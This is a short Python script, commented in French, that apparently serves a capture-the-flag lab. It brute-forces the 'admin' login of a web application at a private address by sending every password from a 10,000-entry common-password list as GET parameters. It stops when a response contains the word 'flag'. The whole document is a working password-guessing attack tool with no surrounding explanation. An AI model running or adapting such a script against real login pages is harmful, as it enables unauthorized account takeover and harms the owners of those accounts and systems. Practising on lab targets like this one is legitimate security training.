import requests
import sys

# Définir les variables
BASE_URL = "http://192.168.56.101/"
LOGIN_ENDPOINT = "index.php?page=signin"
USERNAME = "admin"
PASSWORD_FILE = "10k-most-common.txt"
SUCCESS_KEYWORD = "flag"

# Fonction pour vérifier si "flag" est présent dans la réponse
def check_flag(password):
    full_url = f"{BASE_URL}{LOGIN_ENDPOINT}&username={USERNAME}&password={password}&Login=Login#"
    
    # Effectuer la requête GET et vérifier la présence du mot-clé
    response = requests.get(full_url)
    if SUCCESS_KEYWORD in response.text.lower():
        print(f"Mot de passe trouvé : {password}")
        sys.exit(0)

# Lire chaque mot de passe du fichier passwords.txt et vérifier le mot-clé
with open(PASSWORD_FILE, "r") as file:
    for password in file:
        password = password.strip()  # Supprimer les espaces et les sauts de ligne
        check_flag(password)

# Si aucun mot de passe valide n'est trouvé
print(f"Aucun mot de passe valide trouvé dans le fichier {PASSWORD_FILE}.")

